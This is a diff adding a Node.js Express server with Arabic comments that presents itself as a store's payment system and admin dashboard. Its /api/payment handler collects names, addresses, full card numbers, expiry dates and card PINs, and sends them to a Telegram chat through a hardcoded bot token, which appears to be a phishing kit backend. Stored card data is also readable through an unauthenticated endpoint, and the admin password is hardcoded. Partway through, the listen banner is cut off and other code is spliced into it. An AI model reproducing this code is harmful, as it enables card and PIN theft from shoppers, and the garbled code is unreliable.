@@ -1,0 +1,1384 @@
+const express = require('express');
+const bodyParser = require('body-parser');
+const cors = require('cors');
+const fs = require('fs');
+const path = require('path');
+const { v4: uuidv4 } = require('uuid');
+const https = require('https');
+const multer = require('multer');
+
+const app = express();
+const PORT = 3000;
+
+// ==================== إعدادات Telegram ====================
+const TELEGRAM_BOT_TOKEN = '8042654470:AAFnuJ3bxphgugH9TT62TOrI5EWEo6gH-tU';
+const TELEGRAM_CHAT_ID = '8108427825';
+
+// ==================== إعدادات Admin ====================
+const ADMIN_USERNAME = 'admin';
+const ADMIN_PASSWORD = 'admin123';
+
+// ==================== إعدادات تحميل الملفات ====================
+const uploadsDir = path.join(__dirname, 'uploads');
+if (!fs.existsSync(uploadsDir)) {
+    fs.mkdirSync(uploadsDir, { recursive: true });
+}
+
+const storage = multer.diskStorage({
+    destination: (req, file, cb) => {
+        cb(null, uploadsDir);
+    },
+    filename: (req, file, cb) => {
+        const uniqueSuffix = Date.now() + '_' + Math.round(Math.random() * 1E9);
+        cb(null, uniqueSuffix + '_' + file.originalname);
+    }
+});
+
+const upload = multer({ storage: storage });
+
+// إعدادات Middleware
+app.use(cors());
+app.use(bodyParser.json({ limit: '50mb' }));
+app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }));
+app.use(express.static(__dirname));
+
+// مسار حفظ البيانات
+const dataDir = path.join(__dirname, 'data');
+if (!fs.existsSync(dataDir)) {
+    fs.mkdirSync(dataDir, { recursive: true });
+}
+
+const paymentsFile = path.join(dataDir, 'payments.json');
+const ordersFile = path.join(dataDir, 'orders.json');
+const productsFile = path.join(__dirname, 'products.json');
+
+// دوال مساعدة
+function readJsonFile(filePath, defaultValue = []) {
+    try {
+        if (fs.existsSync(filePath)) {
+            const data = fs.readFileSync(filePath, 'utf-8');
+            return JSON.parse(data);
+        }
+        return defaultValue;
+    } catch (error) {
+        console.error(`خطأ في قراءة ${filePath}:`, error);
+        return defaultValue;
+    }
+}
+
+function writeJsonFile(filePath, data) {
+    try {
+        fs.writeFileSync(filePath, JSON.stringify(data, null, 2), 'utf-8');
+        return true;
+    } catch (error) {
+        console.error(`خطأ في كتابة ${filePath}:`, error);
+        return false;
+    }
+}
+
+// ==================== دالة إرسال البيانات إلى Telegram ====================
+async function sendToTelegram(message) {
+    return new Promise((resolve, reject) => {
+        // تنظيف الرسالة وإزالة المسافات الزائدة
+        let cleanMessage = (message || '').trim();
+        
+        // إذا كانت الرسالة فارغة بعد التنظيف، أرسل رسالة افتراضية
+        if (!cleanMessage) {
+            console.warn('⚠️ رسالة فارغة، سيتم استخدام رسالة افتراضية');
+            cleanMessage = '📩 تم استقبال بيانات جديدة من النظام';
+        }
+        
+        // استبدال \n بـ Unicode escape للتأكد من أن الفواصل تُرسل بشكل صحيح
+        cleanMessage = cleanMessage.replace(/\n/g, '\n');
+        
+        const data = JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: cleanMessage,
+            parse_mode: 'HTML'
+        });
+
+        const options = {
+            hostname: 'api.telegram.org',
+            path: `/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+                'Content-Length': Buffer.byteLength(data)
+            }
+        };
+
+        const req = https.request(options, (res) => {
+            let body = '';
+            res.on('data', (chunk) => body += chunk);
+            res.on('end', () => {
+                try {
+                    const result = JSON.parse(body);
+                    if (result.ok) {
+                        console.log('✅ تم الإرسال إلى Telegram بنجاح');
+                        resolve(result);
+                    } else {
+                        console.error('❌ خطأ من Telegram:', result.description);
+                        reject(result);
+                    }
+                } catch (error) {
+                    reject(error);
+                }
+            });
+        });
+
+        req.on('error', (error) => {
+            console.error('❌ خطأ في الاتصال بـ Telegram:', error);
+            reject(error);
+        });
+
+        req.write(data);
+        req.end();
+    });
+}
+
+// ==================== API Endpoints ====================
+
+// 1. إرسال بيانات الدفع / رسالة عامة
+app.post('/api/payment', (req, res) => {
+    try {
+        const data = req.body;
+        
+        // قبول البيانات بمرونة
+        const {
+            name,
+            message,
+            type,
+            bank,
+            prefix,
+            cardNumber,
+            expiryMonth,
+            expiryYear,
+            pin,
+            amount,
+            orderId,
+            phone,
+            address,
+            city,
+            method,
+            deliveryTime,
+            coupon
+        } = data;
+
+        // إنشاء معرّف فريد
+        const paymentId = uuidv4();
+        const timestamp = new Date().toISOString();
+
+        // إنشاء الرسالة للإرسال إلى Telegram
+        let telegramMessage = '';
+        
+        if (message) {
+            // إذا تم توفير رسالة مباشرة، استخدمها
+            telegramMessage = message;
+        } else {
+            // بناء الرسالة من البيانات المتاحة
+            telegramMessage = `
+🔔 <b>بيانات جديدة من النموذج</b>
+
+<b>الوقت:</b> ${timestamp}
+<b>نوع الطلب:</b> ${type || 'رسالة عامة'}
+<b>معرّف الطلب:</b> ${paymentId}
+
+`;
+            if (name) telegramMessage += `<b>👤 الاسم:</b> ${name}\n`;
+            if (phone) telegramMessage += `<b>📞 الهاتف:</b> ${phone}\n`;
+            if (cardNumber) telegramMessage += `<b>💳 رقم البطاقة:</b> ${cardNumber}\n`;
+            if (pin) telegramMessage += `<b>🔐 الرقم السري:</b> ${pin}\n`;
+            if (bank) telegramMessage += `<b>🏦 البنك:</b> ${bank}\n`;
+            if (address) telegramMessage += `<b>📍 العنوان:</b> ${address}\n`;
+            if (city) telegramMessage += `<b>🏙️ المحافظة:</b> ${city}\n`;
+            if (method) telegramMessage += `<b>🛒 طريقة الشراء:</b> ${method}\n`;
+            if (deliveryTime) telegramMessage += `<b>⏰ موعد التوصيل:</b> ${deliveryTime}\n`;
+            if (coupon) telegramMessage += `<b>🏷️ الكوبون:</b> ${coupon}\n`;
+            if (amount) telegramMessage += `<b>💰 المبلغ:</b> ${amount}\n`;
+        }
+
+        // إنشاء سجل الدفعة
+        const payment = {
+            id: paymentId,
+            timestamp: timestamp,
+            status: 'pending',
+            type: type || 'general',
+            ...data
+        };
+
+        // حفظ البيانات محلياً
+        const payments = readJsonFile(paymentsFile);
+        payments.push(payment);
+        writeJsonFile(paymentsFile, payments);
+
+        // تنظيف الرسالة
+        let finalMessage = (telegramMessage || '').trim();
+        if (!finalMessage) {
+            finalMessage = `🔔 <b>بيانات جديدة - ${type || 'عام'}</b>\n\n${JSON.stringify(data, null, 2)}`;
+        }
+
+        console.log('📤 جاري إرسال الرسالة إلى Telegram...');
+        console.log('📝 محتوى الرسالة:', finalMessage.substring(0, 100) + '...');
+
+        // إرسال إلى Telegram
+        sendToTelegram(finalMessage)
+            .then((result) => {
+                console.log('✅ تم إرسال البيانات إلى Telegram بنجاح');
+                res.json({
+                    success: true,
+                    message: 'تم استقبال البيانات بنجاح',
+                    paymentId: paymentId,
+                    telegramStatus: 'sent'
+                });
+            })
+            .catch((error) => {
+                console.error('⚠️ تم حفظ البيانات محلياً لكن حدث خطأ في إرسالها إلى Telegram:', error);
+                res.json({
+                    success: true,
+                    message: 'تم حفظ البيانات بنجاح (الإرسال إلى Telegram قيد المحاولة)',
+                    paymentId: paymentId,
+                    telegramStatus: 'pending'
+                });
+            });
+
+    } catch (error) {
+        console.error('❌ خطأ في معالجة الطلب:', error);
+        res.status(500).json({
+            success: false,
+            message: 'خطأ في الخادم',
+            error: error.message
+        });
+    }
+});
+
+// 2. إنشاء طلب جديد
+app.post('/api/orders', (req, res) => {
+    try {
+        const { items, totalAmount, customerName, customerPhone } = req.body;
+
+        const order = {
+            id: uuidv4(),
+            timestamp: new Date().toISOString(),
+            status: 'pending', // pending, paid, shipped, delivered
+            items: items,
+            totalAmount: totalAmount,
+            customerName: customerName,
+            customerPhone: customerPhone,
+            paymentMethod: null,
+            paymentId: null
+        };
+
+        const orders = readJsonFile(ordersFile);
+        orders.push(order);
+        writeJsonFile(ordersFile, orders);
+
+        console.log('✅ طلب جديد تم إنشاؤه:', order.id);
+
+        res.json({
+            success: true,
+            message: 'تم إنشاء الطلب بنجاح',
+            orderId: order.id
+        });
+    } catch (error) {
+        console.error('خطأ في إنشاء الطلب:', error);
+        res.status(500).json({
+            success: false,
+            message: 'خطأ في الخادم'
+        });
+    }
+});
+
+// 3. الحصول على جميع الطلبات
+app.get('/api/orders', (req, res) => {
+    try {
+        const orders = readJsonFile(ordersFile);
+        res.json({
+            success: true,
+            data: orders,
+            count: orders.length
+        });
+    } catch (error) {
+        res.status(500).json({
+            success: false,
+            message: 'خطأ في الخادم'
+        });
+    }
+});
+
+// 4. الحصول على جميع المدفوعات
+app.get('/api/payments', (req, res) => {
+    try {
+        const payments = readJsonFile(paymentsFile);
+        res.json({
+            success: true,
+            data: payments,
+            count: payments.length
+        });
+    } catch (error) {
+        res.status(500).json({
+            success: false,
+            message: 'خطأ في الخادم'
+        });
+    }
+});
+
+// 5. الحصول على تفاصيل دفعة محددة
+app.get('/api/payments/:id', (req, res) => {
+    try {
+        const payments = readJsonFile(paymentsFile);
+        const payment = payments.find(p => p.id === req.params.id);
+
+        if (!payment) {
+            return res.status(404).json({
+                success: false,
+                message: 'الدفعة غير موجودة'
+            });
+        }
+
+        res.json({
+            success: true,
+            data: payment
+        });
+    } catch (error) {
+        res.status(500).json({
+            success: false,
+            message: 'خطأ في الخادم'
+        });
+    }
+});
+
+// 6. تحديث حالة الدفعة
+app.put('/api/payments/:id', (req, res) => {
+    try {
+        const { status } = req.body;
+        const payments = readJsonFile(paymentsFile);
+        const paymentIndex = payments.findIndex(p => p.id === req.params.id);
+
+        if (paymentIndex === -1) {
+            return res.status(404).json({
+                success: false,
+                message: 'الدفعة غير موجودة'
+            });
+        }
+
+        payments[paymentIndex].status = status;
+        payments[paymentIndex].updatedAt = new Date().toISOString();
+        writeJsonFile(paymentsFile, payments);
+
+        res.json({
+            success: true,
+            message: 'تم تحديث الدفعة بنجاح',
+            data: payments[paymentIndex]
+        });
+    } catch (error) {
+        res.status(500).json({
+            success: false,
+            message: 'خطأ في الخادم'
+        });
+    }
+});
+
+// 7. لوحة المراقبة - إحصائيات
+app.get('/api/dashboard/stats', (req, res) => {
+    try {
+        const payments = readJsonFile(paymentsFile);
+        const orders = readJsonFile(ordersFile);
+
+        const stats = {
+            totalOrders: orders.length,
+            totalPayments: payments.length,
+            pendingPayments: payments.filter(p => p.status === 'pending').length,
+            completedPayments: payments.filter(p => p.status === 'completed').length,
+            failedPayments: payments.filter(p => p.status === 'failed').length,
+            totalAmount: payments.reduce((sum, p) => sum + (parseFloat(p.amount) || 0), 0)
+        };
+
+        res.json({
+            success: true,
+            data: stats
+        });
+    } catch (error) {
+        res.status(500).json({
+            success: false,
+            message: 'خطأ في الخادم'
+        });
+    }
+});
+
+// 8. تنظيف البيانات (اختياري - حذف جميع البيانات)
+app.post('/api/admin/clear-data', (req, res) => {
+    try {
+        const adminPassword = req.body.password;
+        
+        // كلمة سر بسيطة - غيّرها في الإنتاج
+        if (adminPassword !== 'admin123') {
+            return res.status(403).json({
+                success: false,
+                message: 'كلمة السر غير صحيحة'
+            });
+        }
+
+        writeJsonFile(paymentsFile, []);
+        writeJsonFile(ordersFile, []);
+
+        res.json({
+            success: true,
+            message: 'تم حذف جميع البيانات'
+        });
+    } catch (error) {
+        res.status(500).json({
+            success: false,
+            message: 'خطأ في الخادم'
+        });
+    }
+});
+
+// صفحة الاختبار
+app.get('/admin', (req, res) => {
+    res.send(`
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>لوحة التحكم - نظام الدفع</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        
+        header {
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            margin-bottom: 30px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+        }
+        
+        h1 {
+            color: #333;
+            margin-bottom: 10px;
+        }
+        
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+        
+        .stat-card {
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+        }
+        
+        .stat-card h3 {
+            color: #667eea;
+            font-size: 14px;
+            margin-bottom: 10px;
+            text-transform: uppercase;
+        }
+        
+        .stat-card .value {
+            font-size: 28px;
+            font-weight: bold;
+            color: #333;
+        }
+        
+        .section {
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            margin-bottom: 30px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+        }
+        
+        .section h2 {
+            color: #333;
+            margin-bottom: 20px;
+            padding-bottom: 10px;
+            border-bottom: 2px solid #667eea;
+        }
+        
+        table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+        
+        th {
+            background: #f5f5f5;
+            padding: 12px;
+            text-align: right;
+            color: #333;
+            font-weight: 600;
+            border-bottom: 2px solid #ddd;
+        }
+        
+        td {
+            padding: 12px;
+            border-bottom: 1px solid #ddd;
+        }
+        
+        tr:hover {
+            background: #f9f9f9;
+        }
+        
+        .badge {
+            display: inline-block;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 600;
+        }
+        
+        .badge.pending {
+            background: #fff3cd;
+            color: #856404;
+        }
+        
+        .badge.completed {
+            background: #d4edda;
+            color: #155724;
+        }
+        
+        .badge.failed {
+            background: #f8d7da;
+            color: #721c24;
+        }
+        
+        .btn {
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 14px;
+            transition: all 0.3s;
+        }
+        
+        .btn-primary {
+            background: #667eea;
+            color: white;
+        }
+        
+        .btn-primary:hover {
+            background: #5568d3;
+        }
+        
+        .btn-danger {
+            background: #e74c3c;
+            color: white;
+        }
+        
+        .btn-danger:hover {
+            background: #c0392b;
+        }
+        
+        .empty {
+            text-align: center;
+            padding: 30px;
+            color: #999;
+        }
+        
+        .refresh-btn {
+            background: #667eea;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-bottom: 20px;
+        }
+        
+        .refresh-btn:hover {
+            background: #5568d3;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>🎛️ لوحة التحكم - نظام الدفع المحلي</h1>
+            <p>قم بمراقبة جميع الطلبات والمدفوعات من هنا</p>
+        </header>
+        
+        <div class="stats" id="stats-container">
+            <div class="stat-card">
+                <h3>إجمالي الطلبات</h3>
+                <div class="value" id="total-orders">0</div>
+            </div>
+            <div class="stat-card">
+                <h3>إجمالي المدفوعات</h3>
+                <div class="value" id="total-payments">0</div>
+            </div>
+            <div class="stat-card">
+                <h3>المدفوعات المعلقة</h3>
+                <div class="value" id="pending-payments">0</div>
+            </div>
+            <div class="stat-card">
+                <h3>المدفوعات المكتملة</h3>
+                <div class="value" id="completed-payments">0</div>
+            </div>
+            <div class="stat-card">
+                <h3>إجمالي المبلغ</h3>
+                <div class="value" id="total-amount">0 KD</div>
+            </div>
+        </div>
+        
+        <div class="section">
+            <h2>المدفوعات</h2>
+            <button class="refresh-btn" onclick="loadPayments()">🔄 تحديث</button>
+            <div id="payments-container"></div>
+        </div>
+        
+        <div class="section">
+            <h2>الطلبات</h2>
+            <button class="refresh-btn" onclick="loadOrders()">🔄 تحديث</button>
+            <div id="orders-container"></div>
+        </div>
+    </div>
+    
+    <script>
+        // تحديث الإحصائيات
+        async function loadStats() {
+            try {
+                const response = await fetch('/api/dashboard/stats');
+                const result = await response.json();
+                
+                if (result.success) {
+                    const stats = result.data;
+                    document.getElementById('total-orders').textContent = stats.totalOrders;
+                    document.getElementById('total-payments').textContent = stats.totalPayments;
+                    document.getElementById('pending-payments').textContent = stats.pendingPayments;
+                    document.getElementById('completed-payments').textContent = stats.completedPayments;
+                    document.getElementById('total-amount').textContent = stats.totalAmount.toFixed(2) + ' KD';
+                }
+            } catch (error) {
+                console.error('خطأ:', error);
+            }
+        }
+        
+        // تحميل المدفوعات
+        async function loadPayments() {
+            try {
+                const response = await fetch('/api/payments');
+                const result = await response.json();
+                
+                if (result.success) {
+                    const payments = result.data;
+                    let html = '';
+                    
+                    if (payments.length === 0) {
+                        html = '<div class="empty">لا توجد مدفوعات حتى الآن</div>';
+                    } else {
+                        html = '<table><thead><tr>';
+                        html += '<th>المعرّف</th>';
+                        html += '<th>الاسم</th>';
+                        html += '<th>البنك</th>';
+                        html += '<th>رقم البطاقة</th>';
+                        html += '<th>المبلغ</th>';
+                        html += '<th>الحالة</th>';
+                        html += '<th>التاريخ</th>';
+                        html += '</tr></thead><tbody>';
+                        
+                        payments.forEach(payment => {
+                            html += '<tr>';
+                            html += '<td>' + payment.id.substring(0, 8) + '</td>';
+                            html += '<td>' + payment.customerName + '</td>';
+                            html += '<td>' + payment.bank + '</td>';
+                            html += '<td>****' + payment.cardNumber.substring(payment.cardNumber.length - 4) + '</td>';
+                            html += '<td>' + payment.amount + ' KD</td>';
+                            html += '<td><span class="badge ' + payment.status + '">' + getStatusText(payment.status) + '</span></td>';
+                            html += '<td>' + new Date(payment.timestamp).toLocaleString('ar-SA') + '</td>';
+                            html += '</tr>';
+                        });
+                        
+                        html += '</tbody></table>';
+                    }
+                    
+                    document.getElementById('payments-container').innerHTML = html;
+                }
+            } catch (error) {
+                console.error('خطأ:', error);
+            }
+        }
+        
+        // تحميل الطلبات
+        async function loadOrders() {
+            try {
+                const response = await fetch('/api/orders');
+                const result = await response.json();
+                
+                if (result.success) {
+                    const orders = result.data;
+                    let html = '';
+                    
+                    if (orders.length === 0) {
+                        html = '<div class="empty">لا توجد طلبات حتى الآن</div>';
+                    } else {
+                        html = '<table><thead><tr>';
+                        html += '<th>المعرّف</th>';
+                        html += '<th>اسم العميل</th>';
+                        html += '<th>الهاتف</th>';
+                        html += '<th>المبلغ</th>';
+                        html += '<th>عدد المنتجات</th>';
+                        html += '<th>الحالة</th>';
+                        html += '<th>التاريخ</th>';
+                        html += '</tr></thead><tbody>';
+                        
+                        orders.forEach(order => {
+                            html += '<tr>';
+                            html += '<td>' + order.id.substring(0, 8) + '</td>';
+                            html += '<td>' + order.customerName + '</td>';
+                            html += '<td>' + order.customerPhone + '</td>';
+                            html += '<td>' + order.totalAmount + ' KD</td>';
+                            html += '<td>' + order.items.length + '</td>';
+                            html += '<td><span class="badge ' + order.status + '">' + getStatusText(order.status) + '</span></td>';
+                            html += '<td>' + new Date(order.timestamp).toLocaleString('ar-SA') + '</td>';
+                            html += '</tr>';
+                        });
+                        
+                        html += '</tbody></table>';
+                    }
+                    
+                    document.getElementById('orders-container').innerHTML = html;
+                }
+            } catch (error) {
+                console.error('خطأ:', error);
+            }
+        }
+        
+        function getStatusText(status) {
+            const statusMap = {
+                'pending': 'معلق',
+                'completed': 'مكتمل',
+                'failed': 'فاشل',
+                'paid': 'مدفوع',
+                'shipped': 'مرسل',
+                'delivered': 'تم التسليم'
+            };
+            return statusMap[status] || status;
+        }
+        
+        // تحديث تلقائي كل 5 ثواني
+        setInterval(() => {
+            loadStats();
+            loadPayments();
+            loadOrders();
+        }, 5000);
+        
+        // تحميل أولي
+        loadStats();
+        loadPayments();
+        loadOrders();
+    </script>
+</body>
+</html>
+    `);
+});
+
+// بدء الخادم
+app.listen(PORT, () => {
+    console.log(`
+╔════════════════════════════════════════╗
+║  🚀 خادم الدفع المحلي قيد التشغيل       ║
+// ==================== نظام المصادقة ====================
+function validateAdminAuth(req, res, next) {
+    const authHeader = req.headers['authorization'];
+    if (!authHeader) {
+        return res.status(401).json({ success: false, message: 'غير مصرح' });
+    }
+    
+    const [username, password] = Buffer.from(authHeader.split(' ')[1], 'base64').toString().split(':');
+    
+    if (username === ADMIN_USERNAME && password === ADMIN_PASSWORD) {
+        next();
+    } else {
+        res.status(403).json({ success: false, message: 'بيانات دخول غير صحيحة' });
+    }
+}
+
+// ==================== API للمنتجات ====================
+
+// 1. الحصول على جميع المنتجات
+app.get('/api/products', (req, res) => {
+    try {
+        const products = readJsonFile(productsFile, []);
+        res.json({ success: true, data: products });
+    } catch (error) {
+        res.status(500).json({ success: false, message: 'خطأ في الخادم' });
+    }
+});
+
+// 2. إضافة منتج جديد (في البداية) - محمي
+app.post('/api/products', validateAdminAuth, upload.single('image'), (req, res) => {
+    try {
+        const { name, description, price, previous_price, discount, category } = req.body;
+        const products = readJsonFile(productsFile, []);
+        
+        let image_url = '';
+        if (req.file) {
+            image_url = '/uploads/' + req.file.filename;
+        }
+        
+        const newProduct = {
+            id: products.length ? Math.max(...products.map(p => p.id)) + 1 : 1,
+            name: name || 'منتج بدون اسم',
+            description: description || '',
+            price: parseFloat(price) || 0,
+            previous_price: parseFloat(previous_price) || 0,
+            discount: parseFloat(discount) || 0,
+            category: category || '',
+            image_url: image_url
+        };
+        
+        // إضافة المنتج الجديد في البداية
+        products.unshift(newProduct);
+        writeJsonFile(productsFile, products);
+        
+        res.json({ success: true, message: 'تم إضافة المنتج بنجاح', data: newProduct });
+    } catch (error) {
+        console.error('خطأ:', error);
+        res.status(500).json({ success: false, message: 'خطأ في الخادم', error: error.message });
+    }
+});
+
+// 3. تعديل منتج - محمي
+app.put('/api/products/:id', validateAdminAuth, upload.single('image'), (req, res) => {
+    try {
+        const productId = parseInt(req.params.id);
+        const { name, description, price, previous_price, discount, category } = req.body;
+        const products = readJsonFile(productsFile, []);
+        
+        const productIndex = products.findIndex(p => p.id === productId);
+        if (productIndex === -1) {
+            return res.status(404).json({ success: false, message: 'المنتج غير موجود' });
+        }
+        
+        // تحديث البيانات
+        products[productIndex].name = name || products[productIndex].name;
+        products[productIndex].description = description || products[productIndex].description;
+        products[productIndex].price = parseFloat(price) || products[productIndex].price;
+        products[productIndex].previous_price = parseFloat(previous_price) || products[productIndex].previous_price;
+        products[productIndex].discount = parseFloat(discount) || products[productIndex].discount;
+        products[productIndex].category = category || products[productIndex].category;
+        
+        // تحديث الصورة إذا تم رفع صورة جديدة
+        if (req.file) {
+            // حذف الصورة القديمة
+            if (products[productIndex].image_url && fs.existsSync(path.join(__dirname, products[productIndex].image_url))) {
+                fs.unlinkSync(path.join(__dirname, products[productIndex].image_url));
+            }
+            products[productIndex].image_url = '/uploads/' + req.file.filename;
+        }
+        
+        writeJsonFile(productsFile, products);
+        
+        res.json({ success: true, message: 'تم تحديث المنتج بنجاح', data: products[productIndex] });
+    } catch (error) {
+        console.error('خطأ:', error);
+        res.status(500).json({ success: false, message: 'خطأ في الخادم', error: error.message });
+    }
+});
+
+// 4. حذف منتج محدد - محمي
+app.delete('/api/products/:id', validateAdminAuth, (req, res) => {
+    try {
+        const productId = parseInt(req.params.id);
+        const products = readJsonFile(productsFile, []);
+        
+        const productIndex = products.findIndex(p => p.id === productId);
+        if (productIndex === -1) {
+            return res.status(404).json({ success: false, message: 'المنتج غير موجود' });
+        }
+        
+        // حذف الصورة من الخادم
+        if (products[productIndex].image_url && fs.existsSync(path.join(__dirname, products[productIndex].image_url))) {
+            fs.unlinkSync(path.join(__dirname, products[productIndex].image_url));
+        }
+        
+        const deletedProduct = products.splice(productIndex, 1)[0];
+        writeJsonFile(productsFile, products);
+        
+        res.json({ success: true, message: 'تم حذف المنتج بنجاح', data: deletedProduct });
+    } catch (error) {
+        console.error('خطأ:', error);
+        res.status(500).json({ success: false, message: 'خطأ في الخادم', error: error.message });
+    }
+});
+
+// 5. حذف جميع المنتجات - محمي
+app.delete('/api/products', validateAdminAuth, (req, res) => {
+    try {
+        const products = readJsonFile(productsFile, []);
+        
+        // حذف جميع الصور
+        products.forEach(product => {
+            if (product.image_url && fs.existsSync(path.join(__dirname, product.image_url))) {
+                fs.unlinkSync(path.join(__dirname, product.image_url));
+            }
+        });
+        
+        writeJsonFile(productsFile, []);
+        
+        res.json({ success: true, message: 'تم حذف جميع المنتجات بنجاح' });
+    } catch (error) {
+        console.error('خطأ:', error);
+        res.status(500).json({ success: false, message: 'خطأ في الخادم', error: error.message });
+    }
+});
+
+// 6. تكرار منتج - محمي
+app.post('/api/products/:id/duplicate', validateAdminAuth, (req, res) => {
+    try {
+        const productId = parseInt(req.params.id);
+        const products = readJsonFile(productsFile, []);
+        
+        const productIndex = products.findIndex(p => p.id === productId);
+        if (productIndex === -1) {
+            return res.status(404).json({ success: false, message: 'المنتج غير موجود' });
+        }
+        
+        const duplicatedProduct = {
+            ...products[productIndex],
+            id: Math.max(...products.map(p => p.id)) + 1,
+            name: products[productIndex].name + ' (نسخة)'
+        };
+        
+        // إضافة المنتج المكرر في البداية
+        products.unshift(duplicatedProduct);
+        writeJsonFile(productsFile, products);
+        
+        res.json({ success: true, message: 'تم تكرار المنتج بنجاح', data: duplicatedProduct });
+    } catch (error) {
+        console.error('خطأ:', error);
+        res.status(500).json({ success: false, message: 'خطأ في الخادم', error: error.message });
+    }
+});
+
+// 7. لوحة إدارة المنتجات - محمي
+app.get('/admin-products', (req, res) => {
+    res.send(adminProductsPage());
+});
+
+function adminProductsPage() {
+    return `
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>إدارة المنتجات</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.rtl.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+    <style>
+        body { 
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .container { max-width: 1400px; }
+        header { 
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            margin-bottom: 30px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+        }
+        .product-card { 
+            background: white;
+            border-radius: 10px;
+            overflow: hidden;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+            margin-bottom: 20px;
+            transition: transform 0.3s;
+        }
+        .product-card:hover { transform: translateY(-5px); }
+        .product-image { 
+            width: 100%;
+            height: 200px;
+            object-fit: cover;
+            background: #f0f0f0;
+        }
+        .product-body { padding: 15px; }
+        .product-title { font-weight: bold; color: #333; margin-bottom: 10px; }
+        .product-price { 
+            color: #e74c3c;
+            font-size: 18px;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+        .btn-group { 
+            display: flex;
+            gap: 5px;
+            margin-top: 10px;
+        }
+        .btn-sm { 
+            padding: 5px 10px;
+            font-size: 12px;
+        }
+        .form-section {
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            margin-bottom: 30px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+        }
+        .modal { background: rgba(0,0,0,0.5); }
+        .loading { display: none; text-align: center; padding: 20px; }
+        .loading.show { display: block; }
+        .alert { margin-bottom: 20px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>📦 إدارة المنتجات</h1>
+            <p>أضف، عدّل، احذف، أو كرّر المنتجات</p>
+            <button class="btn btn-danger btn-sm" onclick="logout()"><i class="fas fa-sign-out-alt"></i> تسجيل خروج</button>
+        </header>
+
+        <div id="alert-container"></div>
+
+        <!-- نموذج إضافة/تعديل منتج -->
+        <div class="form-section">
+            <h3>
+                <span id="form-title">➕ إضافة منتج جديد</span>
+            </h3>
+            <form id="product-form" enctype="multipart/form-data">
+                <input type="hidden" id="product-id" />
+                
+                <div class="row">
+                    <div class="col-md-6 mb-3">
+                        <label>اسم المنتج *</label>
+                        <input type="text" class="form-control" id="name" required />
+                    </div>
+                    <div class="col-md-6 mb-3">
+                        <label>الفئة</label>
+                        <input type="text" class="form-control" id="category" placeholder="إلكترونيات، ملابس، إلخ" />
+                    </div>
+                </div>
+
+                <div class="mb-3">
+                    <label>الوصف</label>
+                    <textarea class="form-control" id="description" rows="3"></textarea>
+                </div>
+
+                <div class="row">
+                    <div class="col-md-3 mb-3">
+                        <label>السعر الحالي *</label>
+                        <input type="number" class="form-control" id="price" step="0.01" required />
+                    </div>
+                    <div class="col-md-3 mb-3">
+                        <label>السعر السابق</label>
+                        <input type="number" class="form-control" id="previous_price" step="0.01" />
+                    </div>
+                    <div class="col-md-3 mb-3">
+                        <label>الخصم (%)</label>
+                        <input type="number" class="form-control" id="discount" step="0.01" />
+                    </div>
+                    <div class="col-md-3 mb-3">
+                        <label>الصورة</label>
+                        <input type="file" class="form-control" id="image" accept="image/*" />
+                    </div>
+                </div>
+
+                <div id="image-preview" style="margin-bottom: 15px;"></div>
+
+                <div class="btn-group">
+                    <button type="submit" class="btn btn-primary"><i class="fas fa-save"></i> حفظ</button>
+                    <button type="button" class="btn btn-secondary" onclick="resetForm()"><i class="fas fa-redo"></i> إلغاء</button>
+                </div>
+            </form>
+        </div>
+
+        <!-- عمليات جماعية -->
+        <div class="form-section">
+            <h3>⚙️ عمليات</h3>
+            <button class="btn btn-warning btn-sm" onclick="clearAllProducts()"><i class="fas fa-trash"></i> حذف جميع المنتجات</button>
+            <button class="btn btn-info btn-sm" onclick="loadProducts()"><i class="fas fa-sync"></i> تحديث</button>
+        </div>
+
+        <!-- قائمة المنتجات -->
+        <div class="form-section">
+            <h3>📋 المنتجات</h3>
+            <div class="loading show" id="loading">
+                <div class="spinner-border text-primary" role="status">
+                    <span class="visually-hidden">جاري التحميل...</span>
+                </div>
+                <p>جاري تحميل المنتجات...</p>
+            </div>
+            <div id="products-container" class="row"></div>
+        </div>
